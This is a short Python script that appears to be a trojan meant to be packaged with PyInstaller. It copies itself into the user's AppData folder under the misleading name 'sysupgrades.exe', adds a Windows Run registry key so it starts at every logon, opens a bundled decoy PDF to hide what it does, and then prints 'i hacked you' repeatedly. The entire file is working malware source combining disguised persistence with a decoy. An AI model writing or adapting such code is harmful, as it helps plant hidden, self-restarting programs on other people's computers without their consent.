import time
import subprocess
import os
import shutil
import sys

def AddToRegistry():
    # Persistence
    newFile = os.environ["appdata"] + "\\sysupgrades.exe"
    if not os.path.exists(newFile):
        shutil.copyfile(sys.executable, newFile)
        regeditCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + newFile
        subprocess.call(regeditCommand, shell=True)

AddToRegistry()

def OpenAddedFile():
    addedFile = sys._MEIPASS + "\\yours.pdf"
    subprocess.Popen(addedFile, shell=True)

OpenAddedFile()

counter = 0
while counter < 100:
    print("i hacked you")
    counter += 1
    time.sleep(0.5)

# myCheck = subprocess.check_output("commmand", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
